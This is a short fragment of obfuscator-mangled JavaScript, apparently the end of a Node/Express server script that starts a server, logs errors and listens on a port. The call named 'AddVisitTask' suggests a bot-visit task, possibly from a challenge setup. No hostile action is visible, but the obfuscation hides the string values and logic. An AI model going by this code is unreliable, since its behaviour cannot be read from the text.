AddVisitTask();}catch(_0x186de0){console[_0x25a742(0x280)](_0x25a742(0x273),_0x186de0);}}startserver()[_0x208570(0x278)](_0x5564a7=>{const _0x133f2d=_0x208570;console[_0x133f2d(0x280)](_0x133f2d(0x1fe),_0x5564a7);}),app['listen'](PORT,()=>console['log'](_0x208570(0x235)+PORT+'!'));
